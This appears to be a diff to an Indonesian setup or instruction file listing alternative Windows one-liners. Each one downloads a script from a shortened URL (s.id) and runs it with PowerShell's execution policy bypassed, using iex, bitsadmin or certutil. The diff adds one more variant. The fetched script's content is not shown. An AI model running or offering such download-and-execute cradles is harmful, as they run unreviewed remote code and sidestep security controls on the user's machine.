@@ -22,13 +22,17 @@ powershell -ep Bypass -Command ^
 "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object Net.WebClient).DownloadString('https://s.id/iexambanbk') | iex"
 
 atau
-
+//mantep
 c:\windows\system32\cmd.exe /c "bitsadmin /transfer getScript /download /priority high https://s.id/iexambanbk %temp%\i.ps1 & powershell -ep Bypass -File %temp%\i.ps1"
 
 atau
 
 certutil -urlcache -split -f https://s.id/iexambanbk i.ps1
 powershell -ep Bypass -File i.ps1
+
+atau
+
+c:\windows\system32\cmd.exe /c "powershell -ep Bypass -Command \"(New-Object Net.WebClient).DownloadFile('https://s.id/iexambanbk', '$env:TEMP\1.ps1')\" & powershell -ep Bypass -File %TEMP%\1.ps1"
 
 
 
